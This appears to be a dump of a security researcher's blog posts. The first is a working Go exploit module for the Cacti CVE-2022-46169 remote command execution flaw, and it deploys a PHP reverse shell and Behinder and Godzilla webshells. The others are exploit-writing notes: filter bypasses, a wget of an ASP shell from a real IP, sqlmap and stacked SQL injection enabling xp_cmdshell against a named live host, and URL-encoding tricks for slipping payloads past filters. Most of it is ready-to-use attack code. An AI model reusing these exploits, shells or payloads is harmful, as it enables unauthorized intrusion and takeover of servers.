$poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;/p&gt;&quot;, &quot;Product&quot;: &quot;Cacti-Monitoring&quot;, &quot;Homepage&quot;: &quot;https://www.cacti.net/&quot;, &quot;DisclosureDate&quot;: &quot;2022-12-05&quot;, &quot;Author&quot;: &quot;Gryffinbit@gmail.com&quot;, &quot;FofaQuery&quot;: &quot;header=\\&quot;Set-Cookie: cacti=\\&quot; || title=\\&quot;Login to Cacti\\&quot; || body=\\&quot;/plugins/jqueryskin/include/login.css\\&quot; || header=\\&quot;Cacti Access\\&quot; || banner=\\&quot;Set-Cookie: cacti=\\&quot; || banner=\\&quot;Cacti Access\\&quot;&quot;, &quot;GobyQuery&quot;: &quot;header=\\&quot;Set-Cookie: cacti=\\&quot; || title=\\&quot;Login to Cacti\\&quot; || body=\\&quot;/plugins/jqueryskin/include/login.css\\&quot; || header=\\&quot;Cacti Access\\&quot; || banner=\\&quot;Set-Cookie: cacti=\\&quot; || banner=\\&quot;Cacti Access\\&quot;&quot;, &quot;Level&quot;: &quot;3&quot;, &quot;Impact&quot;: &quot;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;br&gt;&lt;br&gt;&lt;/p&gt;&quot;, &quot;Recommendation&quot;: &quot;&lt;p&gt;1. The manufacturer has released a vulnerability fix, please pay attention to updates in time: &lt;a href=\\&quot;https://www.cacti.net/\\&quot; rel=\\&quot;nofollow\\&quot;&gt;https://www.cacti.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2. Set access policies through security devices such as firewalls and set whitelist access.&lt;/p&gt;&lt;p&gt;3. Unless necessary, it is prohibited to access the system from the public network.&lt;/p&gt;&quot;, &quot;References&quot;: [], &quot;Is0day&quot;: false, &quot;HasExp&quot;: true, &quot;ExpParams&quot;: [ &#123; &quot;name&quot;: &quot;attackType&quot;, &quot;type&quot;: &quot;select&quot;, &quot;value&quot;: &quot;cmd,reverse,webshell&quot;, &quot;show&quot;: &quot;&quot; &#125;, &#123; &quot;name&quot;: &quot;cmd&quot;, &quot;type&quot;: &quot;input&quot;, &quot;value&quot;: &quot;whoami&quot;, &quot;show&quot;: &quot;attackType=cmd&quot; &#125;, &#123; &quot;name&quot;: &quot;webshell&quot;, &quot;type&quot;: &quot;select&quot;, &quot;value&quot;: &quot;behinder,godzilla,custom&quot;, &quot;show&quot;: &quot;attackType=webshell&quot; &#125;, &#123; &quot;name&quot;: &quot;filename&quot;, &quot;type&quot;: &quot;input&quot;, &quot;value&quot;: &quot;hello.php&quot;, &quot;show&quot;: &quot;attackType=webshell,webshell=custom&quot; &#125;, &#123; &quot;name&quot;: &quot;content&quot;, &quot;type&quot;: &quot;input&quot;, &quot;value&quot;: &quot;&lt;?php phpinfo(); ?&gt;&quot;, &quot;show&quot;: &quot;attackType=webshell,webshell=custom&quot; &#125; ], &quot;ExpTips&quot;: &#123; &quot;Type&quot;: &quot;&quot;, &quot;Content&quot;: &quot;&quot; &#125;, &quot;ScanSteps&quot;: [ &quot;AND&quot;, &#123; &quot;Request&quot;: &#123; &quot;method&quot;: &quot;GET&quot;, &quot;uri&quot;: &quot;&quot;, &quot;follow_redirect&quot;: true, &quot;header&quot;: &#123;&#125;, &quot;data_type&quot;: &quot;text&quot;, &quot;data&quot;: &quot;&quot; &#125;, &quot;ResponseTest&quot;: &#123; &quot;type&quot;: &quot;group&quot;, &quot;operation&quot;: &quot;AND&quot;, &quot;checks&quot;: [ &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$code&quot;, &quot;operation&quot;: &quot;==&quot;, &quot;value&quot;: &quot;200&quot;, &quot;bz&quot;: &quot;&quot; &#125;, &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$body&quot;, &quot;operation&quot;: &quot;contains&quot;, &quot;value&quot;: &quot;test&quot;, &quot;bz&quot;: &quot;&quot; &#125; ] &#125;, &quot;SetVariable&quot;: [] &#125; ], &quot;ExploitSteps&quot;: [ &quot;AND&quot;, &#123; &quot;Request&quot;: &#123; &quot;method&quot;: &quot;GET&quot;, &quot;uri&quot;: &quot;/test.php&quot;, &quot;follow_redirect&quot;: true, &quot;header&quot;: &#123;&#125;, &quot;data_type&quot;: &quot;text&quot;, &quot;data&quot;: &quot;&quot; &#125;, &quot;ResponseTest&quot;: &#123; &quot;type&quot;: &quot;group&quot;, &quot;operation&quot;: &quot;AND&quot;, &quot;checks&quot;: [ &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$code&quot;, &quot;operation&quot;: &quot;==&quot;, &quot;value&quot;: &quot;200&quot;, &quot;bz&quot;: &quot;&quot; &#125;, &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$body&quot;, &quot;operation&quot;: &quot;contains&quot;, &quot;value&quot;: &quot;test&quot;, &quot;bz&quot;: &quot;&quot; &#125; ] &#125;, &quot;SetVariable&quot;: [] &#125; ], &quot;Tags&quot;: [ &quot;Command Execution&quot; ], &quot;VulType&quot;: [ &quot;Command Execution&quot; ], &quot;CVEIDs&quot;: [ &quot;CVE-2022-46169&quot; ], &quot;CNNVD&quot;: [ &quot;CNNVD-202212-2342&quot; ], &quot;CNVD&quot;: [ &quot;&quot; ], &quot;CVSSScore&quot;: &quot;9.8&quot;, &quot;Translation&quot;: &#123; &quot;CN&quot;: &#123; &quot;Name&quot;: &quot;Cacti 监控系统 remote_agent.php 命令执行漏洞（CVE-2022-46169）&quot;, &quot;Product&quot;: &quot;Cacti-监控系统&quot;, &quot;Description&quot;: &quot;&lt;p&gt;Cacti 是一个开源平台，可为用户提供强大且可扩展的操作监控和故障管理框架。&lt;/p&gt;&lt;p&gt;小于1.22版本中的remote_agent.php文件中，攻击者无需身份验证即可访问此文件。攻击者可利用get_nfilter_request_var()函数检索的参数$poller_id，来满足poller_item =POLLER_ACTION_SCRIPT_PHP条件，触发proc_open()函数，从而导致命令执行。漏洞利用成功后，未经身份验证的攻击者可以在运行 Cacti 的服务器上执行任意代码。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&quot;, &quot;Recommendation&quot;: &quot;&lt;p&gt;1、厂商已发布了漏洞修复程序，请及时关注更新：&lt;a href=\\&quot;https://www.cacti.net/\\&quot; rel=\\&quot;nofollow\\&quot;&gt;https://www.cacti.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2、通过防火墙等安全设备设置访问策略，设置白名单访问。&lt;/p&gt;&lt;p&gt;3、如非必要，禁止公网访问该系统。&lt;/p&gt;&quot;, &quot;Impact&quot;: &quot;&lt;p&gt;小于1.22版本中的remote_agent.php文件中，攻击者无需身份验证即可访问此文件。攻击者可利用get_nfilter_request_var()函数检索的参数$poller_id，来满足poller_item =POLLER_ACTION_SCRIPT_PHP条件，触发proc_open()函数，从而导致命令执行。漏洞利用成功后，未经身份验证的攻击者可以在运行 Cacti 的服务器上执行任意代码。&lt;br&gt;&lt;/p&gt;&quot;, &quot;VulType&quot;: [ &quot;命令执行&quot; ], &quot;Tags&quot;: [ &quot;命令执行&quot; ] &#125;, &quot;EN&quot;: &#123; &quot;Name&quot;: &quot;Cacti monitoring system remote_agent.php command execution vulnerability (CVE-2022-46169)&quot;, &quot;Product&quot;: &quot;Cacti-Monitoring&quot;, &quot;Description&quot;: &quot;&lt;p&gt;Cacti is an open source platform that provides users with a powerful and scalable operational monitoring and fault management framework.&lt;/p&gt;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;/p&gt;&quot;, &quot;Recommendation&quot;: &quot;&lt;p&gt;1. The manufacturer has released a vulnerability fix, please pay attention to updates in time: &lt;a href=\\&quot;https://www.cacti.net/\\&quot; rel=\\&quot;nofollow\\&quot;&gt;https://www.cacti.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2. Set access policies through security devices such as firewalls and set whitelist access.&lt;/p&gt;&lt;p&gt;3. Unless necessary, it is prohibited to access the system from the public network.&lt;/p&gt;&quot;, &quot;Impact&quot;: &quot;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;br&gt;&lt;br&gt;&lt;/p&gt;&quot;, &quot;VulType&quot;: [ &quot;Command Execution&quot; ], &quot;Tags&quot;: [ &quot;Command Execution&quot; ] &#125; &#125;, &quot;AttackSurfaces&quot;: &#123; &quot;Application&quot;: null, &quot;Support&quot;: null, &quot;Service&quot;: null, &quot;System&quot;: null, &quot;Hardware&quot;: null &#125;, &quot;PostTime&quot;: &quot;2024-01-17&quot;&#125;` filename := goutils.RandomHexString(5) + &quot;.php&quot; base64Encode8dhYGFhsgbbhR := func(input string) string &#123; inputBytes := []byte(input) encodedString := base64.StdEncoding.EncodeToString(inputBytes) return encodedString &#125; sendPayload8dhYGFhsgbbhR := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) &#123; payloadConfig := httpclient.NewGetRequestConfig(&quot;/remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=%7c%20&quot; + url.QueryEscape(payload)) payloadConfig.VerifyTls = false payloadConfig.FollowRedirect = false // 写马进去的过程中，没有响应结果，会有一个默认等待时间，修改那个时间。缩短一点 payloadConfig.Timeout = 2 payloadConfig.Header.Store(&quot;X-Forwarded-For&quot;, &quot;127.0.0.1&quot;) return httpclient.DoHttpRequest(hostInfo, payloadConfig) &#125; uploadFile8dhYGFhsgbbhR := func(hostInfo *httpclient.FixUrl, content, param string) (*httpclient.HttpResponse, error) &#123; // &lt;?php system(base64_decode($_GET[1]));?&gt; 单引号会被吃，并且需要用get的请求方式 checkFileConfig := httpclient.NewGetRequestConfig(&quot;/&quot; + filename) checkFileConfig.VerifyTls = false checkFileConfig.FollowRedirect = false // 检查小马是否存在，不存在就创建 if resp, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); resp == nil &amp;&amp; err != nil &#123; return nil, err &#125; else if resp != nil &amp;&amp; resp.StatusCode != 200 &#123; // 写马进去的过程中，没有响应结果 sendPayload8dhYGFhsgbbhR(hostInfo, content) // 文件不存在，重新检查文件是否被创建成功 if check, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); check == nil &amp;&amp; err != nil &#123; return nil, err &#125; else if check != nil &amp;&amp; check.StatusCode != 200 &#123; return nil, errors.New(&quot;创建文件失败&quot;) &#125; &#125; // 文件存在，直接发送 checkRequestConfig := httpclient.NewGetRequestConfig(&quot;/&quot; + filename + param) checkRequestConfig.VerifyTls = false checkRequestConfig.FollowRedirect = false return httpclient.DoHttpRequest(hostInfo, checkRequestConfig) &#125; checkFile8dhYGFhsgbbhR := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) &#123; checkFileConfig := httpclient.NewGetRequestConfig(&quot;/&quot; + uri) checkFileConfig.VerifyTls = false checkFileConfig.FollowRedirect = false return httpclient.DoHttpRequest(hostInfo, checkFileConfig) &#125; ExpManager.AddExploit(NewExploit( goutils.GetFileName(), expJson, func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool &#123; checkStr := goutils.RandomHexString(8) resp, _ := uploadFile8dhYGFhsgbbhR(hostInfo, `echo &#x27;&lt;?php system(base64_decode($_GET[1]));?&gt;&#x27; &gt; `+filename, `?1=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(&quot;echo &quot;+checkStr))) return resp != nil &amp;&amp; resp.StatusCode == 200 &amp;&amp; strings.Contains(resp.Utf8Html, checkStr) &#125;, func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult &#123; attackType := goutils.B2S(ss.Params[&quot;attackType&quot;]) if attackType == &quot;cmd&quot; &#123; filename = goutils.RandomHexString(5) + &quot;.php&quot; cmd := goutils.B2S(ss.Params[&quot;cmd&quot;]) if resp, err := uploadFile8dhYGFhsgbbhR(expResult.HostInfo, `echo &#x27;&lt;?php system(base64_decode($_GET[1]));?&gt;&#x27; &gt; `+filename, `?1=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(cmd))); resp != nil &amp;&amp; resp.StatusCode == 200 &#123; expResult.Success = true expResult.Output = resp.Utf8Html &#125; else if err != nil &#123; expResult.Output = err.Error() &#125; else &#123; expResult.Output = `漏洞利用失败` &#125; &#125; else if attackType == &quot;reverse&quot; &#123; filename = goutils.RandomHexString(5) + &quot;.php&quot; reverseFilename := goutils.RandomHexString(5) + &quot;.php&quot; waitSessionCh := make(chan string) rp, err := godclient.WaitSession(&quot;reverse_linux_none&quot;, waitSessionCh) if err != nil &#123; expResult.Output = &quot;无可用反弹端口&quot; return expResult &#125; addr := godclient.GetGodServerHost() reverseCode := `&lt;?phpset_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#x27;` + addr + `&#x27;; $port = ` + rp + `; $chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;$daemon = 0;$debug = 0;if (function_exists(&#x27;pcntl_fork&#x27;)) &#123; $pid = pcntl_fork(); if ($pid == -1) &#123; printit(&quot;ERROR: Can&#x27;t fork&quot;); exit(1); &#125; if ($pid) &#123; exit(0); // Parent exits &#125; if (posix_setsid() == -1) &#123; printit(&quot;Error: Can&#x27;t setsid()&quot;); exit(1); &#125; $daemon = 1;&#125; else &#123; printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) &#123; printit(&quot;$errstr ($errno)&quot;); exit(1);&#125;$descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) );$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) &#123; printit(&quot;ERROR: Can&#x27;t spawn shell&quot;); exit(1);&#125;stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) &#123; if (feof($sock)) &#123; printit(&quot;ERROR: Shell connection terminated&quot;); break; &#125; if (feof($pipes[1])) &#123; printit(&quot;ERROR: Shell process terminated&quot;); break; &#125; $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) &#123; if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); &#125; if (in_array($pipes[1], $read_a)) &#123; if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); &#125; if (in_array($pipes[2], $read_a)) &#123; if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); &#125;&#125;fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) &#123; if (!$daemon) &#123; print &quot;$string\\n&quot;; &#125;&#125;?&gt; ` uploadFile8dhYGFhsgbbhR(expResult.HostInfo, `echo &#x27;&lt;?php $file = $_GET[1];$content = $_GET[2];file_put_contents($file, base64_decode($content));?&gt;&#x27; &gt; `+filename, `?1=`+reverseFilename+`&amp;2=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(reverseCode))) checkFile8dhYGFhsgbbhR(expResult.HostInfo, reverseFilename) select &#123; case webConsoleID := &lt;-waitSessionCh: if u, err := url.Parse(webConsoleID); err == nil &#123; expResult.Success = true expResult.OutputType = &quot;html&quot; sid := strings.Join(u.Query()[&quot;id&quot;], &quot;&quot;) expResult.Output = `&lt;br/&gt;&lt;a href=&quot;goby://sessions/view?sid=` + sid + `&amp;key=` + godclient.GetKey() + `&quot;&gt;open shell&lt;/a&gt;` &#125; case &lt;-time.After(time.Second * 20): expResult.Success = false expResult.Output = &quot;漏洞利用失败&quot; &#125; &#125; else if attackType == &quot;webshell&quot; &#123; var content string webshell := goutils.B2S(ss.Params[&quot;webshell&quot;]) filename = goutils.RandomHexString(8) + &quot;.php&quot; webshellFilename := goutils.RandomHexString(5) + &quot;.php&quot; if webshell == &quot;behinder&quot; &#123; /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ content = `&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&quot;k&quot;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&quot;openssl&quot;))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i++)&#123;$post[$i]=$post[$i]^$key[$i+1&amp;15];&#125;&#125;else&#123;$post=openssl_decrypt($post,&quot;AES128&quot;,$key);&#125;$arr=explode(&quot;|&quot;,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p)&#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt;` &#125; else if webshell == &quot;godzilla&quot; &#123; // 哥斯拉 pass key content = `&lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K)&#123; for($i=0;$i&lt;strlen($D);$i++) &#123; $c = $K[$i+1&amp;15]; $D[$i] = $D[$i]^$c; &#125; return $D; &#125; $pass=&quot;pass&quot;; $payloadName=&quot;payload&quot;; $key=&quot;3c6e0b8a9c15224a&quot;; if (isset($_POST[$pass]))&#123; $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName]))&#123; $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123; $payload=encode($payload,$key); &#125; eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); &#125;else&#123; if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123; $_SESSION[$payloadName]=encode($data,$key);&#125;&#125;&#125;?&gt;` &#125; else &#123; content = goutils.B2S(ss.Params[&quot;content&quot;]) webshellFilename = goutils.B2S(ss.Params[&quot;filename&quot;]) &#125; if resp, err := uploadFile8dhYGFhsgbbhR(expResult.HostInfo, `echo &#x27;&lt;?php $file = $_GET[1];$content = $_GET[2];file_put_contents($file, base64_decode($content));?&gt;&#x27; &gt; `+filename, `?1=`+webshellFilename+`&amp;2=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(content))); resp != nil &amp;&amp; (resp.StatusCode == 200 || resp.StatusCode == 500) &#123; expResult.Success = true expResult.Output = &quot;WebShell URL: &quot; + expResult.HostInfo.FixedHostInfo + &quot;/&quot; + webshellFilename + &quot;\\n&quot; if webshell == &quot;behinder&quot; &#123; expResult.Output += &quot;Password: rebeyond\\n&quot; expResult.Output += &quot;WebShell tool: Behinder v3.0\\n&quot; &#125; else if webshell == &quot;godzilla&quot; &#123; expResult.Output += &quot;Password: pass 加密器：PHP_XOR_BASE64\\n&quot; expResult.Output += &quot;WebShell tool: Godzilla v4.1\\n&quot; &#125; expResult.Output += &quot;Webshell type: php&quot; &#125; else if err != nil &#123; expResult.Output = err.Error() &#125; else &#123; expResult.Output = `漏洞利用失败` &#125; &#125; else &#123; expResult.Output = `未知的利用方式` &#125; return expResult &#125;, ))&#125;","categories":[{"name":"写 exp 遇到的问题","slug":"写-exp-遇到的问题","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://gryffinbit.top/tags/PHP/"}],"author":"Gryffinbit"},{"title":"写exp时遇到的问题（普遍版）","slug":"写exp时遇到的问题","date":"2023-10-19T19:06:37.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/写exp时遇到的问题/","permalink":"https://gryffinbit.top/2023/10/20/%E5%86%99exp%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"引号被过滤今天命令执行，想要上传马，遇到了引号被过滤掉的问题。最终找到了三种方式来解决。 用echo -e 对它16进制编码 1echo -e &quot;\\x22hello\\x22&quot; &gt;&gt; a.asp 因为它本身的asp里面有引号，我通过它仅有的命令head和cut，把它摘到了我的上传文件中 1head -n 1 home.asp | cut -c 23 &gt;&gt; a.asp 因为有个别的案例，它有wget命令，我就用它下载匿名服务器里的asp马进去了。 1wget http://5.188.230.77/ps/shell.asp 不知道 WEB 路径在哪里还遇到一些小问题。比如不知道web的路径在哪里，如果可以命令执行的话，就find访问的首页。 1find / -name home.asp 这个返回路径，就是web的文件路径了。写入的时候，写进去这个web路径，但是GET访问的时候，直接根目录的去访问它。（因为相对路径的设置原因）也不一定是根目录，从命令执行的漏洞点进去之后，看自己的当前路径。当前路径在哪里，get就访问哪里 echo 用法问题写入文件的时候，为了避免换行，可以用以下方式写入 1echo -n &quot;hello&quot;&gt;a.txt 追加写入 1echo -n &quot;hello&quot;&gt;&gt;a.txt 找绝对路径windows 可以挨个换盘符，实现全局搜索的目的 12dir D:\\*url.md* /s /bdir D:\\*2023-10-25 /s /b POC 验证POC验证的时候，执行命令，用echo字符串的方式来进行验证。或者可以用md5（1）这种方式来验证。但是因为有的系统没有md5.所以推荐用echo","categories":[{"name":"写 exp 遇到的问题","slug":"写-exp-遇到的问题","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[],"author":"Gryffinbit"},{"title":"sql 注入xpcmdshell相关问题","slug":"sql-注入xpcmdshell相关问题","date":"2023-10-19T18:48:39.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/sql-注入xpcmdshell相关问题/","permalink":"https://gryffinbit.top/2023/10/20/sql-%E6%B3%A8%E5%85%A5xpcmdshell%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/","excerpt":"","text":"sql注入select * from master.dbo.sysobjects where xtype&#x3D;’x’ and name&#x3D;’xp_cmdshell’select count(*) from master.dbo.sysobjects where xtype&#x3D;’x’ and name&#x3D;’xp_cmdshell’ &#x2F;&#x2F; 存在返回1 1python .\\sqlmap.py -r .\\point.txt --proxy sock5://127.0.0.1:7890 ponit.txt 的内容 id&#x3D;666666 是注入点的位置，* 代表优先从这里开始 123456GET /linksframe/linkadd.jsp?id=666666* HTTP/1.1Host: 1.196.238.71:93User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15Accept-Encoding: gzip, deflateConnection: close SQLmap的过程，可以看到数据库是什么，比如是Microsoft SQl Server （也就是mssql） 1python .\\sqlmap.py -r .\\point.txt --proxy socks5://127.0.0.1:7890 --os-shell 通过这个语句，看看有没有shell可以捡 1python .\\sqlmap.py -r .\\point.txt --proxy socks5://127.0.0.1:7890 --sql-shell 通过这个语句，可以拿到sqlshell，执行sql语句。 1http://1.196.238.71:93/linksframe/linkadd.jsp?id=666666&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;-- 1GET /linksframe/linkadd.jsp?id=666666&#x27; union all select 9af,null,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;GRYFF&#x27;)),null,null,&#x27;33&#x27;;WAITFOR DELAY &#x27;0:0:4 HTTP/1.1 通过这种方式，看能否堆叠注入。 在sqlshell 里面查看是否开启xpcmdshell 12select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27; // 存在返回1 之所以要堆叠注入的原因，是因为需要开启xpcmdshell，他需要先开启，然后再保存配置。 123456&#x27; union all select 9af,null,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;GRYFF&#x27;)),null,null,null;exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;exec master..xp_cmdshell &#x27;ping 6byyxc.dnslog.cn sys.fn_sqlvarbasetostr 的作用是能让md5回显。 结尾需要注释 12345678910111213141516171819 GET /linksframe/linkadd.jsp?id=666666&#x27;%20union%20all%20select%209af%2cnull%2csys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;%2c&#x27;GRYFF&#x27;))%2cnull%2cnull%2cnull%3bexec%20sp_configure%20&#x27;show%20advanced%20options&#x27;%2c%201%3breconfigure%3bEXEC%20sp_configure%20&#x27;xp_cmdshell&#x27;%2c1%3bRECONFIGURE%3b%20--%20 HTTP/1.1Host: 1.196.238.71:93 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflateConnection: close GET /linksframe/linkadd.jsp?id=666666&#x27;%20union%20all%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%3bEXEC%20sp_configure%20&#x27;show%20advanced%20options&#x27;%2c1%3bRECONFIGURE%3bEXEC%20sp_configure%20&#x27;xp_cmdshell&#x27;%2c1%3bRECONFIGURE%3b%20-- HTTP/1.1Host: 1.196.238.71:93 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflateConnection: close GET /linksframe/linkadd.jsp?id=666666&#x27;%20union%20all%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%3bCREATE%20TABLE%20cmdtmp%20(dir%20varchar(8000))%3b--%20 HTTP/1.1Host: 1.196.238.71:93 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflateConnection: close 而且有时sql注入，必须带上前面的查询结果（select那部分） 此次sql注入案例原型： 【9.6 例行优化】【sql升级rce模板】用友 KSOA linkadd.jsp sql 注入（CVD-2023-1698）.go","categories":[{"name":"写 exp 遇到的问题","slug":"写-exp-遇到的问题","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"xpcmdshell","slug":"xpcmdshell","permalink":"https://gryffinbit.top/tags/xpcmdshell/"}],"author":"Gryffinbit"},{"title":"URL 编码问题","slug":"URL-编码问题","date":"2023-10-19T18:38:13.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/10/20/URL-编码问题/","permalink":"https://gryffinbit.top/2023/10/20/URL-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"漏洞录入《宏景人力资源信息管理系统 codesettree 接口 SQL 注入漏洞》，汲取的灵感。 那个编码，对一些特殊字符，用百分号+十六进制的骚方法。。。。先普通url一次之后，再对一些特殊字符编码。他不是简单的多次url编码。这是另一种url编码。叫encodeURIComponent，这是java中的一个类。 java对url编码有两种方式，一个是encodeURI，一个是encodeURIComponent 然后我发现，encodeURI的方式，就不会解码%2C。也就是不会对，这些特殊字符进行编码 URL Decode Online | URLDecoder 一个实例11&#x27; union all select 849754578,(select @@VERSION) -- 进行第一次url编码，整体编码。URL Encode Online | URLEncoder 11%27%20union%20all%20select%20849754578%2C%28select%20%40%40VERSION%29%20-- 会发现，数字部分以及--部分没有被编码，所以需要找16进制对应的部分，加上%，再次编码 1%31%27%20union%20all%20select%20%38%34%39%37%35%34%35%37%38%2C%28select%20%40%40VERSION%29%20%2d%2d 有必要的话，还需要将%换成~ 1~31~27~20union~20all~20select~20~38~34~39~37~35~34~35~37~38~2c~28select~20~40~40VERSION~29~20~2d~2d 然后这一串，就可以去get，在burp发送数据包了 多次url编码实例多次 url 编码，是多次16进制的编码 最终编码结果 